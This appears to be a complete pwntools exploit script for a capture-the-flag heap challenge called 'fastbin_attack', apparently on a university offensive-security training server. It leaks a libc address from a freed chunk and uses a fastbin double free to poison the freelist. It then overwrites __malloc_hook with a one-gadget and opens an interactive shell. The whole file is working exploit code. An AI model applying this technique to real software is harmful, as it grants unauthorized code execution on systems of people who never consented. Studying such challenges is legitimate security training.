from pwn import *

# context.terminal = ['tmux', 'splitw', '-h']

if "REMOTE" not in args:

    # ssh = ssh("acidburn", "localhost", password="acidburn", port=2222)
    # r = ssh.process("fastbin_attck_")
    r = process("fastbin_attack")
    gdb.attach(r, """
        # b *0x0804841c
        # c
        """)

    input("wait")
else:
    r = remote("bin.training.offdef.it", 10101)


def alloc(size):
    r.recvuntil(b"> ")
    r.sendline(b"1")
    r.recvuntil(b"Size: ")
    r.sendline(b"%d" % size)
    r.recvuntil(b"index ")
    return int(r.recvuntil(b"!")[:-1])


def write_(index, data):
    r.recvuntil(b"> ")
    r.sendline(b"2")
    r.recvuntil(b"Index: ")
    r.sendline(b"%d" % index)
    r.recvuntil(b"Content: ")
    r.send(data)
    r.recvuntil(b"Done!\n")


def read_(index):
    r.recvuntil(b"> ")
    r.sendline(b"3")
    r.recvuntil(b"Index: ")
    r.sendline(b"%d" % index)
    return r.recvuntil(b"\nOptions:")[:-len(b"\nOptions:")]


def free(index):
    r.recvuntil(b"> ")
    r.sendline(b"4")
    r.recvuntil(b"Index: ")
    r.sendline(b"%d" % index)
    r.recvuntil(b"freed!\n")


# LIBC LEAK
i = alloc(200)
i1 = alloc(10)
free(i)
print("index %d" % i)
libc_leak = u64(read_(i).ljust(8, b'\x00'))
libc_base = libc_leak - 0x3c4b78
malloc_hook = 0x3c4b10 + libc_base
shift_malloc_hook = malloc_hook - 0x23
libc_xorRaxRaxRet = 0x8b945 + libc_base
oneGadget_raxNULL = 0x45226 + libc_base

print("[!] libc_leak: %#x" % libc_leak)
print("[!] libc@%#x" % libc_base)
print("[!] malloc hook@%#x" % malloc_hook)
print("[!] shifted malloc hook@%#x" % shift_malloc_hook)
print("[!] gadget@%#x" % libc_xorRaxRaxRet)
print("[!] one gadget@%#x" % oneGadget_raxNULL)

# clean free list
i = alloc(200)

# FAST BIN ATTACK
SIZE = 0x60
c2 = alloc(SIZE)
c1 = alloc(SIZE)
free(c1)
free(c2)
free(c1)
t1 = alloc(SIZE)
alloc(SIZE)

write_(t1, p64(shift_malloc_hook))

alloc(SIZE)

malloc_hook_index = alloc(SIZE)

payload = b"A" * (0x23 - 0x10)
payload += p64(oneGadget_raxNULL)

write_(malloc_hook_index, payload)

input("Check")

alloc(0x20)

r.interactive()
